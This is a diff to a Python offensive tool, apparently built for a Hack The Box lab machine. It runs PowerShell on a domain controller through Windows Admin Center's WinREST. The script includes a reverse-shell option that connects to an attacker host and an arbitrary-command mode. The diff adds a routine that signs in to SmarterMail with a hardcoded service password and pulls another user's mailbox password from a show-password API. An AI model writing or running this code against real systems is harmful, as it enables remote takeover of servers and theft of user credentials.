@@ -100,22 +100,40 @@ def run_ps_on_dc(
 
 
 def parse_winrest_output(data: dict) -> str:
-    """استخراج المخرجات من استجابة WinREST."""
+    """استخراج المخرجات من استجابة WinREST - نسخة محسّنة."""
+    # طباعة الـ raw JSON كاملاً للـ debug
+    print("[DEBUG] Full WinREST JSON:")
+    print(json.dumps(data, indent=2)[:5000])
+    
     props = data.get("properties", data) if data else {}
     results = props.get("results") or []
     errors = props.get("errors") or []
-
+    
     out_lines = []
+    
     for item in results:
         if isinstance(item, str):
             out_lines.append(item)
         elif isinstance(item, dict):
-            out_lines.append(item.get("value", "") or item.get("toString", ""))
-
+            # جرب كل الحقول الممكنة
+            val = (item.get("value") or 
+                   item.get("toString") or 
+                   item.get("text") or
+                   item.get("output") or
+                   str(item))
+            if val:
+                out_lines.append(str(val))
+    
     for err in errors:
         msg = err.get("message", "") if isinstance(err, dict) else str(err)
         out_lines.append(f"[ERROR] {msg}")
-
+    
+    # إذا كان results فارغاً، ابحث في أماكن أخرى
+    if not out_lines:
+        for key in ["output", "stdout", "text", "content", "result"]:
+            if key in props:
+                out_lines.append(str(props[key]))
+    
     return "\n".join(out_lines).strip()
 
 
@@ -134,6 +152,60 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
     $stream.Flush()
 }};
 $client.Close()
+'''
+
+
+def build_noah_ps() -> str:
+    """استخراج كلمة مرور noah.b من SmarterMail show-password API."""
+    return '''
+$ErrorActionPreference = "Continue"
+$base = "http://localhost:17017"
+
+# Step 1: Login as svc_mail
+$authJson = '{"username":"svc_mail","password":"Hacked123"}'
+$req = [System.Net.WebRequest]::Create("$base/api/v1/auth/authenticate-user")
+$req.Method = "POST"
+$req.ContentType = "application/json"
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($authJson)
+$req.ContentLength = $bytes.Length
+$stream = $req.GetRequestStream()
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Close()
+$resp = $req.GetResponse()
+$reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
+$authContent = $reader.ReadToEnd()
+$reader.Close()
+Write-Output "AUTH_RESPONSE: $authContent"
+
+$authObj = ConvertFrom-Json $authContent
+$token = $authObj.accessToken
+Write-Output "TOKEN_EXTRACTED: $($token.Substring(0,20))..."
+
+# Step 2: Get noah.b password
+$showJson = "{`"token`":`"$token`",`"emailAddress`":`"noah.b@danglingtree.htb`"}"
+$req2 = [System.Net.WebRequest]::Create("$base/api/v1/settings/domain/show-password/")
+$req2.Method = "POST"
+$req2.ContentType = "application/json"
+$req2.Headers.Add("Authorization", "Bearer $token")
+$bytes2 = [System.Text.Encoding]::UTF8.GetBytes($showJson)
+$req2.ContentLength = $bytes2.Length
+$stream2 = $req2.GetRequestStream()
+$stream2.Write($bytes2, 0, $bytes2.Length)
+$stream2.Close()
+try {
+    $resp2 = $req2.GetResponse()
+    $reader2 = New-Object System.IO.StreamReader($resp2.GetResponseStream())
+    $showContent = $reader2.ReadToEnd()
+    $reader2.Close()
+    Write-Output "SHOW_PASSWORD_RESPONSE: $showContent"
+} catch {
+    Write-Output "SHOW_PASSWORD_ERROR: $($_.Exception.Message)"
+    $errResp = $_.Exception.Response
+    if ($errResp) {
+        $errReader = New-Object System.IO.StreamReader($errResp.GetResponseStream())
+        Write-Output "ERROR_BODY: $($errReader.ReadToEnd())"
+    }
+}
 '''
 
 
@@ -164,6 +236,7 @@ def main():
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("--check", action="store_true", help="Only check SmarterMail reachability")
     group.add_argument("--shell", action="store_true", help="Execute reverse shell")
+    group.add_argument("--noah", action="store_true", help="Extract noah.b password from SmarterMail")
     group.add_argument("--command", help="Execute arbitrary PowerShell command")
 
     # خيارات الشيل
@@ -189,6 +262,9 @@ def main():
     if args.check:
         ps_script = build_check_ps()
         print("[*] Checking SmarterMail reachability...")
+    elif args.noah:
+        ps_script = build_noah_ps()
+        print("[*] Extracting noah.b password from SmarterMail...")
     elif args.shell:
         if not args.lhost or not args.lport:
             print("[-] Please specify --lhost and --lport for reverse shell")
@@ -196,8 +272,10 @@ def main():
         ps_script = build_reverse_shell_ps(args.lhost, args.lport)
         print(f"[*] Sending reverse shell to {args.lhost}:{args.lport}...")
     else:
-        ps_script = args.command
-        print(f"[*] Executing command: {ps_script}")
+        # إذا كان الأمر يبدأ بـ @ فهو multiline - نزيل الـ @
+        cmd = args.command.strip().lstrip('@').rstrip('@').strip()
+        ps_script = cmd
+        print(f"[*] Executing PS script ({len(ps_script)} chars)")
 
     # تشغيل السكربت على الخادم
     print("[*] Running PowerShell on DC via WAC WinREST...")
